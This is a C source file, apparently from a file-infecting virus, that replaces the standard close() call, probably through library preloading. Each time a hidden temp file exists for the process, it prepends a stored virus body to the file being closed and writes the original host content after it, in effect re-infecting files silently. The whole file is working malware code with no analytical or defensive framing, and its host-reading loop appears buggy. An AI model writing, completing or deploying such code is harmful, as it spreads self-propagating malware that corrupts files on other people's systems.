#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#define _FCNTL_H yoyoyo
#include <bits/fcntl.h>
#include <stdlib.h>

int close(int fdes){
	int i, hostSize;
	uid_t ruid;
	pid_t myPid;
	char buf, *hostBuf;
	char tmpPath[50];
	struct stat hostStat;
	struct stat virusStat;

	ruid = getuid();
	myPid = getpid();

	sprintf(tmpPath, "/tmp/.%d.%d.%d", myPid, fdes, ruid);
	//printf("[Close] tmpPath: %s\n", tmpPath);
	if(stat(tmpPath, &virusStat) == -1){
		 syscall(__NR_close, fdes);
	}else{
		//copy the infected junk back in.
		int virusTmpFd;
		virusTmpFd = syscall(__NR_open, tmpPath, O_RDONLY);
		//perror("yo: ");
		fstat(fdes, &hostStat);
		//read host into buffer
		hostSize = hostStat.st_size;
		hostBuf = malloc(hostSize);
		i = 0;
		lseek(fdes, 0, SEEK_SET);
		while(read(fdes, hostBuf+i++, 1)<0);
		//printf("yo \n");

		//write virus+sentinel back to host
		lseek(fdes, 0, SEEK_SET);
		lseek(virusTmpFd, 0, SEEK_SET);
		while(read(virusTmpFd, &buf, 1) != 0){
		//	perror("what? ");
			write(fdes, &buf, 1);
		}

		//write uninfected back to host
		i = 0;
		while((i+=write(fdes, hostBuf+i, hostSize-i))<hostSize);
		free(hostBuf);
		syscall(__NR_close, virusTmpFd);
		unlink(tmpPath);
	}
	syscall(__NR_close, fdes);
}
